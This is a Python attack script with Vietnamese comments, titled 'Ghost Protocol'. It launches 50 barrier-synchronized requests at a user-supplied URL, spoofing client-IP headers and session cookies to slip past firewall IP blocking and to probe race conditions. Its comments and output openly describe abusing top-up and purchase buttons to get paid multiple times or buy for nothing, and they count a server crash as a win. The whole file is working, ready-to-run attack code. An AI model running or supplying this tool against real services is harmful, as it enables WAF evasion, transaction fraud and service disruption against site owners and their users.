import sys
import requests
import threading
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

# CẤU HÌNH TẤN CÔNG
TARGET_URL = ""
THREADS = 50  # Số lượng "bóng ma" tấn công cùng lúc
BARRIER = threading.Barrier(THREADS) # Cái cổng để giữ tất cả xuất phát cùng lúc
RESULTS = []

def print_banner():
    print(Fore.RED + """
    =======================================================
    SECURITY TOOL V10 - THE GHOST PROTOCOL
    (Bypass WAF & Race Condition Logic Breaker)
    Level: GOD MODE | Coder: Người anh em
    =======================================================
    """)

# HÀM TẠO IP GIẢ (FAKE IP GENERATOR)
def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# HÀM TẤN CÔNG ĐỒNG BỘ
def ghost_attack(thread_index):
    try:
        # 1. KỸ THUẬT BYPASS WAF (IP SPOOFING)
        # Tạo ra hàng loạt header giả mạo để lừa server rằng đây là các người dùng khác nhau
        fake_ip = generate_fake_ip()
        headers = {
            'User-Agent': f'Mozilla/5.0 (Ghost-Attacker-{thread_index})',
            'X-Forwarded-For': fake_ip,
            'X-Originating-IP': fake_ip,
            'Client-IP': fake_ip,
            'X-Remote-IP': fake_ip,
            'X-Remote-Addr': fake_ip,
            'X-Client-IP': fake_ip,
            'Cookie': f'session_id=ghost_{random.randint(1000,9999)}' # Giả lập phiên làm việc khác nhau
        }

        # 2. KỸ THUẬT RACE CONDITION (ĐỒNG BỘ HÓA THỜI GIAN)
        # Đợi tất cả các luồng khác sẵn sàng tại "cổng rào" (Barrier)
        # Để đảm bảo 50 request này bắn ra ở CÙNG 1 MILISECOND
        BARRIER.wait() 
        
        start_t = time.time()
        # Bắn vào endpoint nhạy cảm (VD: Nút mua, Nút nhận thưởng, hoặc trang chủ để test WAF)
        res = requests.get(TARGET_URL, headers=headers, timeout=10)
        end_t = time.time()
        
        RESULTS.append({
            'ip': fake_ip,
            'code': res.status_code,
            'time': end_t - start_t,
            'size': len(res.text)
        })
        
        if res.status_code == 200:
            print(Fore.GREEN + f"   [Ghost #{thread_index}] IP: {fake_ip} -> BYPASS THÀNH CÔNG (200 OK)")
        elif res.status_code == 403 or res.status_code == 429:
            print(Fore.RED + f"   [Ghost #{thread_index}] IP: {fake_ip} -> BỊ CHẶN (WAF hoạt động)")
        else:
             print(Fore.YELLOW + f"   [Ghost #{thread_index}] -> Code {res.status_code} (Server bối rối)")

    except Exception as e:
        # Nếu server sập hoặc timeout, đó cũng là một chiến thắng
        pass

def analyze_ghost_report():
    print(Fore.YELLOW + "\n" + "="*50)
    print(Fore.YELLOW + "   BÁO CÁO PHÂN TÍCH 'GHOST PROTOCOL'")
    print(Fore.YELLOW + "="*50)
    
    total = len(RESULTS)
    success = len([r for r in RESULTS if r['code'] == 200])
    unique_sizes = set([r['size'] for r in RESULTS])
    
    print(f"Tổng số 'Bóng ma' gửi đi: {THREADS}")
    print(f"Số lượng vượt qua tường lửa thành công: {Fore.RED}{success}/{THREADS}")
    
    print("\n" + "-"*50)
    print(Fore.CYAN + "[KẾT LUẬN CHIẾN THUẬT]:")
    
    # 1. PHÂN TÍCH BYPASS
    if success > int(THREADS * 0.8):
        print(Fore.GREEN + "1. BYPASS TƯỜNG LỬA: THÀNH CÔNG TUYỆT ĐỐI!")
        print(f"   Lý do: Tôi đã dùng {THREADS} IP giả khác nhau. Server của họ tin sái cổ.")
        print("   -> Chứng minh: Hệ thống chặn IP của họ VÔ DỤNG trước kỹ thuật IP Spoofing.")
    else:
        print(Fore.YELLOW + "1. BYPASS TƯỜNG LỬA: THẤT BẠI (Họ có WAF xịn).")

    # 2. PHÂN TÍCH RACE CONDITION (QUAN TRỌNG)
    # Nếu server trả về các kết quả có kích thước khác nhau cho cùng 1 lệnh,
    # Chứng tỏ Logic server đang bị loạn (Race Condition).
    if len(unique_sizes) > 1 and success > 0:
        print(Fore.GREEN + "\n2. RACE CONDITION: PHÁT HIỆN LỖ HỔNG LOGIC!")
        print("   Dấu hiệu: Các request giống hệt nhau nhưng Server trả về kết quả khác nhau (Kích thước file khác nhau).")
        print("   -> Ý NGHĨA: Server đang xử lý không đồng bộ.")
        print(Fore.RED + "   -> TẤN CÔNG GIẢ ĐỊNH: Nếu đây là nút 'Nạp thẻ', tôi nạp 1 lần ăn 5 lần.")
        print(Fore.RED + "   -> TẤN CÔNG GIẢ ĐỊNH: Nếu đây là nút 'Mua Acc', tôi mua 1 acc nhưng trừ tiền 0 đồng.")
    else:
        print(Fore.WHITE + "\n2. Race Condition: Chưa thấy dấu hiệu rõ ràng (Hoặc cần endpoint cụ thể hơn).")

    # XUẤT FILE BÁO CÁO CUỐI CÙNG
    filename = f"BAO_CAO_GHOST_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("BÁO CÁO BẢO MẬT: BYPASS & LOGIC BREAKING\n")
        f.write(f"Mục tiêu: {TARGET_URL}\n")
        f.write("Kỹ thuật: IP Spoofing + Thread Barrier Synchronization\n")
        f.write("-" * 50 + "\n")
        f.write(f"Kết quả Bypass: {success}/{THREADS} request lọt qua.\n")
        if len(unique_sizes) > 1:
            f.write("CẢNH BÁO: Phát hiện phản hồi không nhất quán (Dấu hiệu Race Condition).\n")
            f.write("Hệ thống dễ bị tổn thương khi xử lý giao dịch tiền tệ/vật phẩm.\n")
        else:
            f.write("Phản hồi hệ thống đồng nhất.\n")
            
    print(Fore.GREEN + f"\n[DONE] Đã xuất báo cáo tối thượng: {filename}")

def main():
    global TARGET_URL
    print_banner()
    
    print("Công cụ này chứng minh: Tường lửa của họ là 'Mù' và Logic của họ là 'Rời rạc'.")
    TARGET_URL = input(Fore.YELLOW + "Nhập URL mục tiêu (Nên là URL check giao dịch/tìm kiếm): ").strip()
    
    print(Fore.YELLOW + f"\n[*] Đang triệu hồi {THREADS} bóng ma (Ghosts)...")
    print(Fore.YELLOW + "[*] Chờ tín hiệu đồng bộ để tấn công CÙNG 1 THỜI ĐIỂM...")
    
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=ghost_attack, args=(i+1,))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    analyze_ghost_report()

if __name__ == "__main__":
    main()